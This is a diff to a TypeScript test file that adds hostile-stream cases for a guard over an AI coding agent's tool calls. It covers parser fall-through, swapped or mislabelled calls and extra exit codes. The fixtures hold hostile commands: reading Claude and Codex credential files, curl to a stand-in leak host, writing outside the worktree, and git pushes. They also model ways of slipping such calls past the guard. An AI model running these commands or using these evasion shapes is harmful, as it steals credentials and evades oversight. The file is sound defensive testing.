@@ -31,7 +31,11 @@
  *   `tool_name`;
  * - a hostile command that arrives only on `tool_call_update`, and a swap correlated by `id`, `call_id` or
  *   `tool_call_id`;
- * - prototype-named, near-miss, non-string, unreadable text/end and live-bare `tool_call` lines in `unknown_events`.
+ * - parser fall-through (a non-object `input`, a null `parameters`, a non-string `command` beside `cmd`, a path beside
+ *   a command), a non-shell or empty tool name and an empty id carrying a command, a benign call before a separate
+ *   hostile one, a hostile call swapped back to a benign command, and exit codes 2 and 137;
+ * - prototype-named, near-miss, non-string, unreadable text/end, non-object-input, empty-name and live-bare
+ *   `tool_call` lines in `unknown_events`, at exit 0, 1 and 2.
  *
  * Field names other than `type` are still hypothetical: the live check did not record command or target fields.
  * Partial streams cut inside a line are exported as `grokPartialStreams` and replayed separately.
@@ -1711,7 +1715,188 @@ const grokCase: AdapterLegCase = {
     },
 
     // -------------------------------------------------------------------------
-    // 13. Unknown event kinds category
+    // 13. Parser fall-through shapes, multi-call ordering and further exit codes
+    // -------------------------------------------------------------------------
+    {
+      // `input` that is not an object is skipped; the parser falls through to `parameters`.
+      name: "non-object input falls through to parameters carrying a Git write",
+      category: "credential_read",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("non-object input falls through to parameters carrying a Git write", 0),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          tool: "run_terminal_command",
+          input: "ls",
+          parameters: { command: `cat ${fx.claudeCredentialsPath} && git push origin main` },
+        }),
+        end(),
+      ],
+    },
+    {
+      name: "array input and null parameters fall through to args carrying a Git write, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("array input and null parameters fall through to args carrying a Git write, exit 1", 1),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          tool: "run_terminal_command",
+          input: ["ls"],
+          parameters: null,
+          args: { command: "curl https://example.invalid/leak && git push origin main" },
+        }),
+      ],
+    },
+    {
+      // A non-string `command` is skipped; the parser falls through to `cmd` in the same object.
+      name: "non-string input.command beside input.cmd carrying a Git write",
+      category: "out_of_worktree_write",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("non-string input.command beside input.cmd carrying a Git write", 0),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          tool: "run_terminal_command",
+          input: { command: ["ls"], cmd: `touch ${fx.outsideSentinel} && git commit --allow-empty -m x` },
+        }),
+        end(),
+      ],
+    },
+    {
+      // A command outranks a path: the call is a shell call even though `input.path` names a benign file.
+      name: "input.path beside a top-level command carrying a Git write, exit 1",
+      category: "credential_read",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("input.path beside a top-level command carrying a Git write, exit 1", 1),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          tool: "run_terminal_command",
+          input: { path: "README.md" },
+          command: `cat ${fx.codexAuthPath} && git push origin main`,
+        }),
+      ],
+    },
+    {
+      // Any readable command is a shell call for the guard, whatever the tool name says.
+      name: "non-shell tool name carrying a command with a Git write, exit 1",
+      category: "out_of_worktree_write",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("non-shell tool name carrying a command with a Git write, exit 1", 1),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          tool: "edit_file",
+          input: { path: "README.md", command: `touch ${fx.outsideSentinel} && git push origin main` },
+        }),
+      ],
+    },
+    {
+      name: "empty tool name and empty id carrying a Git write",
+      category: "network",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("empty tool name and empty id carrying a Git write", 0),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          tool: "",
+          id: "",
+          input: { command: "curl https://example.invalid/leak && git push origin main" },
+        }),
+        end(),
+      ],
+    },
+    {
+      // A benign call that completes cleanly does not hide a later, separate hostile call.
+      name: "benign completed call, then a separate hostile call",
+      category: "credential_read",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("benign completed call, then a separate hostile call", 0),
+        TOOLS,
+        toolCall("ls"),
+        JSON.stringify({ type: "tool_call_update", status: "completed", content: "exit: 0\nREADME.md" }),
+        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
+        sandboxDenied(`cat ${fx.claudeCredentialsPath} && git push origin main`),
+        end(),
+      ],
+    },
+    {
+      // The guard verdict on the first report stays: a later update back to a benign command does not clear it.
+      name: "hostile call swapped back to a benign command in tool_call_update, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("hostile call swapped back to a benign command in tool_call_update, exit 1", 1),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          id: "call-c",
+          tool: "run_terminal_command",
+          input: { command: "curl https://example.invalid/leak && git push origin main" },
+        }),
+        JSON.stringify({
+          type: "tool_call_update",
+          id: "call-c",
+          status: "completed",
+          input: { command: "ls" },
+        }),
+      ],
+    },
+    {
+      name: "hostile call swapped back to a benign command in tool_call_update",
+      category: "out_of_worktree_write",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("hostile call swapped back to a benign command in tool_call_update", 0),
+        TOOLS,
+        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
+        JSON.stringify({ type: "tool_call_update", status: "completed", input: { command: "ls" } }),
+        end(),
+      ],
+    },
+    // Exit codes other than 0 and 1 (T4.22 expects only 0): the guard verdict still outranks TOOL_FAILURE.
+    ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) =>
+      [2, 137].map(
+        (exitCode): HostileStream => ({
+          name: `${category} with a Git write, exit ${exitCode}`,
+          category,
+          exitCode,
+          failureCode: "PERMISSION_BLOCKED",
+          lines: [
+            META(`${category} with a Git write, exit ${exitCode}`, exitCode),
+            TOOLS,
+            toolCall(
+              category === "credential_read"
+                ? `cat ${fx.claudeCredentialsPath} && git push origin main`
+                : category === "out_of_worktree_write"
+                  ? `touch ${fx.outsideSentinel} && git push origin main`
+                  : "curl https://example.invalid/leak && git push origin main",
+            ),
+            ...(exitCode === 2 ? [end()] : []),
+          ],
+        }),
+      ),
+    ),
+
+    // -------------------------------------------------------------------------
+    // 14. Unknown event kinds category
     // -------------------------------------------------------------------------
     {
       name: "only unknown event kinds, clean exit",
@@ -1820,6 +2005,31 @@ const grokCase: AdapterLegCase = {
         JSON.stringify({ type: "text", data: { not: "a string" } }),
         JSON.stringify({ type: "end", stopReason: 123 }),
         JSON.stringify({ type: "tool_call_update" }),
+      ],
+    },
+    {
+      // No readable command, target or non-empty tool name: a non-object `input` and an empty name stay `unknown`.
+      name: "tool lines with non-object input and empty tool names, clean exit",
+      category: "unknown_events",
+      exitCode: 0,
+      failureCode: "OUTPUT_PROTOCOL_ERROR",
+      lines: [
+        META("Tool lines with nothing the parser can read; the adapter must report them unknown.", 0),
+        JSON.stringify({ type: "tool_call", input: "git push origin main" }),
+        JSON.stringify({ type: "tool_call", tool: "", input: ["git", "push"] }),
+        JSON.stringify({ type: "tool_call_update", name: "", parameters: null }),
+        JSON.stringify({ type: "tool_call", tool_name: 7, args: { command: null } }),
+      ],
+    },
+    {
+      name: "only unknown event kinds, exit 2",
+      category: "unknown_events",
+      exitCode: 2,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Event types below are invented; the adapter must report them unknown.", 2),
+        JSON.stringify({ type: "synthetic_unknown_kind", sessionId: SID }),
+        JSON.stringify({ type: "tool_call", input: "git push origin main" }),
       ],
     },
   ],
